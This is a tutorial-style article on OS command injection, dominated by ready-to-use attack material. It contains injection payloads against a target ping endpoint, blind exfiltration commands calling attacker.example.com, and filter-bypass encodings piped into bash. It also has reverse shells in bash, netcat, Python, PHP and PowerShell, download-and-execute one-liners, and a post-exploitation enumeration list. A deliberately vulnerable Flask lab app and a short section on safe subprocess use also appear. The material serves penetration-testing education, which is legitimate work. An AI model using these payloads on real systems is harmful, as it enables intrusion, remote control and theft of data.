Command Injection

Exploiting applications that pass user-controlled input to system shell interpreters to execute arbitrary operating system commands.

Overview

Command injection happens when untrusted input reaches a shell interpreter. This article shows how to recognize the vulnerable functions, how shell metacharacters chain commands, how to confirm and exploit blind injection through time and network side channels, and how to defeat the naive blacklist filters that applications still rely on.

Required Reading

  • Processes - fork, exec, process lifecycle, parent/child relationships
  • System Calls - syscall interface, execve, pipes, file descriptors
  • HTTP - request parameters, headers, request/response structure

How Command Injection Happens

Every command injection vulnerability shares a single root cause: user-controlled data reaching a function that invokes a shell interpreter. The critical distinction is between exec* functions and shell-invoking functions. 

execve("/bin/ping", ["ping", "-c", "1", user_input], env)
  → user_input is argument[3] to the ping binary
  → No shell involved. $, ;, &&, | are passed literally to ping
  → SAFE

system(f"ping -c 1 {user_input}")
  → The string is passed to /bin/sh -c "..."
  → Shell interprets ; | && $() `` as operators
  → VULNERABLE

The core insight: a shell is a programming language interpreter. When user input reaches a shell, the user can write code in that language. The defense is preventing user data from ever reaching a shell - use execve directly with argument arrays.

Functions that Invoke Shells

Language Shell-Invoking (Vulnerable) Safe Alternative

Python os.system(),subprocess.call(shell=True),os.popen() subprocess.run([...], shell=False)

Command Chaining Operators

The shell interprets these metacharacters as command separators. Their behavior differs in how they handle exit codes. 

# Operator reference
command1 ; command2     # Execute command2 regardless of command1's exit code
command1 && command2    # Execute command2 ONLY if command1 succeeds (exit 0)
command1 || command2    # Execute command2 ONLY if command1 fails (exit non-zero)
command1 | command2     # Pipe stdout of command1 to stdin of command2
command1 `command2`     # Execute command2, substitute its output into command1's args
command1 $(command2)    # Same as backticks, modern syntax
command1 \n command2    # Newline as separator (in some parsing contexts)
						
# Applying operators to injection points
# Base request: POST /ping  host=8.8.8.8
# Server runs: ping -c 4 8.8.8.8

# Semicolon — always executes
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8; id'

# Backticks — inline command substitution
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8`id`'

# $() — modern substitution
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8$(id)'

# Pipe — redirect output through attacker command
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8 | id'

# AND — only if ping succeeds
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8 && id'

# OR — executes if ping FAILS (useful when ping output isn't shown)
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8 || id'

# Newline injection — some parsers split on \n before exec
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8%0aid'

Ping-Specific Detection

Ping forms are the most common command injection entry points:

# If the app runs: ping -c 4 $user_input
# Injection payloads:
8.8.8.8; ls -la /
8.8.8.8 && whoami
8.8.8.8 | cat /etc/passwd
$(id)                          # If backtick handler removed the host
`curl http://attacker.com/?data=$(whoami)`

Blind Command Injection

When the command output is not reflected in the response, detection requires side-channel observation.

Time-Based Detection

The command sleeps when the injection is successful:

# Ping test
curl -s -w '\nTime: %{time_total}s\n' \
  --data-urlencode 'host=8.8.8.8; sleep 5' \
  'https://target.example.com/ping'
# If response time >= 5 seconds → injection confirmed

# Alternative: ping to localhost with specific count
curl -s -w '\nTime: %{time_total}s\n' \
  --data-urlencode 'host=8.8.8.8; ping -c 5 127.0.0.1' \
  'https://target.example.com/ping'

# Alternative: write file then check for it
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8; touch /tmp/pwned_by_command_injection'
# If you have a second injection or file read, check for /tmp/pwned_by_command_injection

curl -s --data-urlencode 'host=8.8.8.8; nslookup $(whoami).attacker.example.com' \
  'https://target.example.com/ping'

# HTTP exfiltration — curl
curl -s --data-urlencode 'host=8.8.8.8; curl http://attacker.example.com:8080/$(whoami)' \
  'https://target.example.com/ping'

# HTTP exfiltration — wget
curl -s --data-urlencode 'host=8.8.8.8; wget http://attacker.example.com:8080/$(id | base64)' \
  'https://target.example.com/ping'

# OOB with netcat (if available)
curl -s --data-urlencode 'host=8.8.8.8; echo $(id) | nc attacker.example.com 4444' \

# /dev/tcp (bash only, common on Linux)
curl -s --data-urlencode 'host=8.8.8.8; exec 3<>/dev/tcp/attacker.example.com/4444; echo $(whoami) >&3' \
  'https://target.example.com/ping'

Filter Bypass Techniques

Applications often implement blacklist filters on user input. These filters are almost always breakable because the shell's syntax is too flexible.

Whitespace bypass

# ${IFS} — Internal Field Separator (default: space, tab, newline)
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
ls${IFS}-la

# Tab character (%09)
curl -s --data-urlencode 'host=8.8.8.8;cat%09/etc/passwd' \
  'https://target.example.com/ping'

# Brace expansion (bash)
{cat,/etc/passwd}

# Variable assignment as space substitute
X=$'\x20cat\x20/etc/passwd' && $X

# Input redirection
cat</etc/passwd

# No space at all — use command substitution
$(cat</etc/passwd)
`cat</etc/passwd`

Command Separator Bypass

# URL-encoded separators (single encode)
%0a  → newline
%0d  → carriage return (sometimes alone, sometimes %0d%0a)
%3b  → semicolon
%26  → ampersand

# Double URL-encoding (if app decodes once, WAF checks, then app decodes again)
%250a → %0a after first decode → newline after second decode
%253b → %3b after first decode → ; after second decode

# Test with:
curl -s --data-urlencode 'host=8.8.8.8%0aid' 'https://target.example.com/ping'
curl -s --data-urlencode 'host=8.8.8.8%250aid' 'https://target.example.com/ping'

# Unicode line separator
%E2%80%A8  # Unicode line separator U+2028

Character blacklist bypass

# If specific characters are blocked (/ ; space etc):
# Use encoding tricks to generate them at runtime

# tr — translate characters
cat $(echo 'L2V0Yy9wYXNzd2QK' | tr 'A-Za-z' 'N-ZA-Mn-za-m')  # base64 → rotate13
echo 'L2V0Yy9wYXNzd2QK' | base64 -d | bash  # base64 decode

# Hexadecimal
echo $'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash

# Octal
echo $'\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144' | bash

# printf
printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash

# awk
awk 'BEGIN{printf "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",99,97,116,32,47,101,116,99,47,112,97,115,115,119,100}' | bash

Character concatenation bypass

# If the filter blocks "cat" but allows individual characters:
# Concatenation via single quotes
c'a't /etc/passwd
'c'"a"'t' /etc/passwd

# Concatenation via variables
a=c; b=at; $a$b /etc/passwd

# Concatenation via backticks/substitution
`echo c``echo a``echo t` /etc/passwd
$(echo c)$(echo a)$(echo t) /etc/passwd

# Case variation
# If "cat" is filtered but case matters:
CAT /etc/passwd   # Fails on case-sensitive filesystems but test
CaT /etc/passwd
$(tr '[A-Z]' '[a-z]' <<<'CAT') /etc/passwd  # lowercase conversion

Wildcard Bypass

# ? matches single character
cat /etc/passw?
cat /???/????wd

# * matches any characters
cat /etc/p*
cat /e*/p*

# Brackets for character sets
cat /etc/[p]asswd
cat /etc/p[a][s][s]w[d]

Blacklisted word bypass

# Double quotes break word into tokens (shell still reassembles)
c"a"t /etc/passwd

# Backslash escaping within words
c\a\t /etc/passwd

# Variable default values
cat ${PATH:0:1}etc${PATH:0:1}passwd  # Uses / from PATH

# Environment variable extraction
echo $SHELL
echo ${SHELL:0:1}bin${SHELL:0:1}cat

# History expansion
!! # Executes previous command (in interactive bash)

Common Injection Points Beyond Ping

Any user input that is passed to a shell function is a potential injection point.

# File upload — filename used in convert/move command
# Upload: file named "image.jpg; id > /var/www/html/pwned.txt"
curl -X POST https://target.example.com/upload \
  -F "file=@test.jpg;filename=test.jpg; id > /var/www/html/pwned.txt"

# Email sending form — from/to/subject passed to sendmail
curl -X POST https://target.example.com/contact \
  --data-urlencode 'email=user@example.com; id > /tmp/pwned'

# ZIP extraction — filename in ZIP used unsafely
# Create a ZIP with a file named: "$(id > /tmp/pwned).txt"

# PDF/image conversion — filename in ImageMagick, Ghostscript, LibreOffice CLI
curl -X POST https://target.example.com/convert \
  --data-urlencode 'input=test.pdf&output=output; id > /tmp/pwned'  # output param injectable

# Cron job form — cron expression passed to crontab
curl -X POST https://target.example.com/schedule \
  --data-urlencode 'cron=* * * * * root id > /tmp/pwned'

# Database backup form — filename in mysqldump/pg_dump
curl -X POST https://target.example.com/backup \
  --data-urlencode 'filename=backup; id > /tmp/pwned.sql'

From Injection to Reverse Shell

Detection → Confirmation → File Read → Reverse Shell.

# Attacker machine: start listener
ncat -lvnp 4444

# Phase 1: Basic detection
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8; echo vulnerable'

# Phase 2: Verify command execution and enumerate
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8; id'
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8; uname -a'
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8; which nc ncat python3 python bash sh'

# Phase 3: Attempt reverse shell — try multiple methods
# Bash reverse shell
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode "host=8.8.8.8; bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'"

# netcat reverse shell (Traditional netcat: -e flag)
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8; nc 10.0.0.1 4444 -e /bin/bash'

# netcat reverse shell (OpenBSD netcat: no -e)
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f'

# Python reverse shell
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode "host=8.8.8.8; python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.0.0.1\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\"])'"

# PHP reverse shell (if PHP is available)
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode "host=8.8.8.8; php -r '\$sock=fsockopen(\"10.0.0.1\",4444); exec(\"/bin/bash -i <&3 >&3 2>&3\");'"

# Curl-based: download and execute a script
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8; curl http://10.0.0.1/shell.sh | bash'

# wget-based: download and execute
curl -s -X POST 'https://target.example.com/ping' \
  --data-urlencode 'host=8.8.8.8; wget -O /tmp/shell.sh http://10.0.0.1/shell.sh; bash /tmp/shell.sh'

Windows Command Injection Differences

Windows cmd.exe has different operators and syntax than /bin/sh . These are critical when the target runs on Windows with IIS or ASP.NET.

Unix (/bin/sh) Windows (cmd.exe) Behavior
; & Always execute next command
&& && Execute next if previous succeeds
\|\| \|\| Execute next if previous fails
\| \| Pipe stdout
N/A No backtick substitution in cmd.exe
$(cmd) N/A No $() in cmd.exe
N/A %VAR% Variable expansion
/ \ Path separator 
# Windows injection payloads
8.8.8.8 & whoami
8.8.8.8 & type C:\Windows\System32\drivers\etc\hosts
8.8.8.8 & dir C:\inetpub\wwwroot\

# Windows reverse shell (PowerShell)
8.8.8.8 & powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()"

# Windows file write via certutil
8.8.8.8 & certutil -urlcache -f http://10.0.0.1/shell.exe shell.exe & shell.exe

Manual Exploitation Walkthrough

A complete exploit against a vulnerable network diagnostic tool. The application has a form that runs ping -c 4 {user_input} . 

#!/usr/bin/env python3
"""
Vulnerable Flask app — ping utility with command injection.
Includes: basic injection, filtered injection, blind injection.
"""
from flask import Flask, request, render_template_string
import subprocess
import re

app = Flask(__name__)

HTML = """
<html><body>
<h2>Network Diagnostic Tool</h2>
<hr>

<h3>Level 1: Basic Ping (no filter)</h3>
<form method="POST" action="/ping">
  <input name="host" placeholder="IP address" value="8.8.8.8">
  <input type="submit" value="Ping">
</form>
{% if ping1 %}<pre>{{ ping1 }}</pre>{% endif %}
<hr>

<h3>Level 2: Filtered Ping (strips spaces and semicolons)</h3>
<form method="POST" action="/ping-filtered">
  <input name="host" placeholder="IP address">
  <input type="submit" value="Ping (Filtered)">
</form>
{% if ping2 %}<pre>{{ ping2 }}</pre>{% endif %}
<hr>

<h3>Level 3: Blind Ping (no output, logs only)</h3>
<form method="POST" action="/ping-blind">
  <input name="host" placeholder="IP address">
  <input type="submit" value="Ping (Blind)">
</form>
{% if ping3 %}<p>{{ ping3 }}</p>{% endif %}
</body></html>
"""

@app.route('/ping', methods=['POST'])
def ping():
    host = request.form.get('host', '8.8.8.8')
    # VULNERABLE: os.system() passes string to shell
    import os
    result = os.popen(f"ping -c 4 {host} 2>&1").read()
    return render_template_string(HTML, ping1=result)

@app.route('/ping-filtered', methods=['POST'])
def ping_filtered():
    host = request.form.get('host', '8.8.8.8')
    # WEAK FILTER: strips spaces and semicolons — trivial to bypass
    host = host.replace(' ', '').replace(';', '')
    result = subprocess.getoutput(f"ping -c 4 {host} 2>&1")
    return render_template_string(HTML, ping2=result)

@app.route('/ping-blind', methods=['POST'])
def ping_blind():
    host = request.form.get('host', '8.8.8.8')
    import os
    os.system(f"ping -c 4 {host} > /dev/null 2>&1 &")
    return render_template_string(HTML, ping3="Ping executed. Check listener for callback.")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)

Safe API Alternatives

The defense is simple: never pass user data to a shell. Use the programming language's direct process execution API with argument arrays. 

# VULNERABLE — shell=True or string command
subprocess.run(f"ping -c 4 {host}", shell=True)   # SHELL INVOLVED → VULNERABLE
subprocess.getoutput(f"ping -c 4 {host}")          # SHELL INVOLVED → VULNERABLE
os.system(f"ping -c 4 {host}")                      # SHELL INVOLVED → VULNERABLE

# SAFE — argument list, no shell
subprocess.run(["ping", "-c", "4", host], shell=False, capture_output=True)
# host is always one argument to ping. Even if host = "8.8.8.8; id",
# ping receives it as a literal string, not as shell syntax.

# SAFE — legacy os module with exec
pid = os.fork()
if pid == 0:
    os.execvp("ping", ["ping", "-c", "4", host])

# SAFE — C
execlp("ping", "ping", "-c", "4", host, (char*)NULL);
// or: execvp("ping", argv_array);
// NEVER: system(command_string);

Verification Commands

After discovering command injection, verify the environment before proceeding to exploitation:

# What user are we?
; id
; whoami

# What OS and kernel?
; uname -a
; cat /etc/os-release

# What shell is available?
; which bash sh ash dash zsh

# What utilities are available?
; which nc ncat curl wget python python3 php perl ruby
; ls /bin /usr/bin | head -50

# Network configuration
; ip addr show
; ip route show
; cat /etc/resolv.conf

# What processes are running? (might reveal AV/EDR)
; ps aux

# Any firewalls?
; iptables -L -n 2>/dev/null || ufw status 2>/dev/null || firewall-cmd --list-all 2>/dev/null

# Write permissions test
; touch /tmp/test_write && echo writable || echo not_writable
; touch /var/www/html/test_write && echo writable || echo not_writable

Common Mistakes

  1. Using 'subprocess.run()' with 'shell=True'. The flag is named correctly - it invokes the shell. Even if you pass a list, shell=True concatenates it into a string and passes to sh -c .
  2. Assuming 'exec()' in PHP/Ruby/Perl is safe. In these languages, exec() invokes the shell by default. Use the multi-argument form.
  3. Filtering is not sanitization. Blacklists of characters are always bypassable. The shell has too many encoding options.
  4. Not URL-encoding properly. The --data-urlencode flag in curl handles encoding; --data does not. Always verify what bytes are actually being sent.
  5. Forgetting that 'Runtime.exec(String)' in Java tokenizes on whitespace. The command "ls -la" becomes ["ls", "-la"] - splitting breaks. Use ProcessBuilder with a List<String> .
